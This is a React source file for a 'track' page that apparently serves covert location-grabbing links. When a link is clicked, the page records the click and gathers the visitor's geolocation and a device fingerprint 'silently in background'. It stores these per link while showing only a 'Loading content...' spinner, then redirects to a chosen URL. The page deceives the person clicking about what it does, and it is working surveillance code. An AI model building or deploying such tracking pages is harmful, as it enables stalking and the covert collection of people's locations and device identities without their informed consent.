import { useEffect, useState } from 'react';
import { useSearchParams } from 'react-router-dom';
import { Loader2 } from 'lucide-react';
import { getCurrentLocation } from '@/utils/geolocation';
import { getDeviceFingerprint } from '@/utils/deviceFingerprint';
import { saveLocation, getSessionId } from '@/utils/storage';
import { checkGeolocationPermission } from '@/utils/geolocation';
import { LocationData } from '@/types';
import { getConfig, incrementLinkClick, incrementLinkCapture } from '@/utils/config';

const TrackPage = () => {
  const [searchParams] = useSearchParams();
  const [status, setStatus] = useState<'loading' | 'redirecting'>('loading');
  
  useEffect(() => {
    const captureAndRedirect = async () => {
      const linkId = searchParams.get('id');
      const customUrl = searchParams.get('url');
      
      // Increment click count
      if (linkId) {
        incrementLinkClick(linkId);
      }
      
      // Get target URL
      const config = getConfig();
      const targetUrl = customUrl || config.defaultTargetUrl;
      
      try {
        // Capture location and device data silently in background
        const [permissionStatus] = await Promise.all([
          checkGeolocationPermission(),
        ]);
        
        // Start location capture (don't wait for it)
        const capturePromise = (async () => {
          try {
            const [locationResult, deviceFingerprint] = await Promise.all([
              getCurrentLocation(),
              getDeviceFingerprint(),
            ]);
            
            const locationData: LocationData = {
              id: crypto.randomUUID(),
              sessionId: getSessionId(),
              timestamp: new Date().toISOString(),
              ...locationResult,
              ...deviceFingerprint,
              permissionStatus,
            };
            
            saveLocation(locationData);
            
            // Increment capture count
            if (linkId) {
              incrementLinkCapture(linkId);
            }
          } catch (error) {
            // Silent fail - still redirect
            console.error('Location capture failed:', error);
          }
        })();
        
        // Wait 2-3 seconds OR until location captured (whichever comes first)
        await Promise.race([
          capturePromise,
          new Promise(resolve => setTimeout(resolve, 2500)),
        ]);
        
      } catch (error) {
        // Silent fail
        console.error('Error:', error);
      } finally {
        // Always redirect after timeout
        setTimeout(() => {
          setStatus('redirecting');
          window.location.replace(targetUrl);
        }, 500);
      }
    };
    
    captureAndRedirect();
  }, [searchParams]);
  
  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center">
      <div className="text-center space-y-6">
        <Loader2 className="w-12 h-12 text-gray-400 animate-spin mx-auto" />
        <div className="space-y-2">
          <p className="text-gray-600">
            {status === 'loading' ? 'Loading content...' : 'Redirecting...'}
          </p>
          <p className="text-sm text-gray-400">Please wait</p>
        </div>
      </div>
    </div>
  );
};

export default TrackPage;
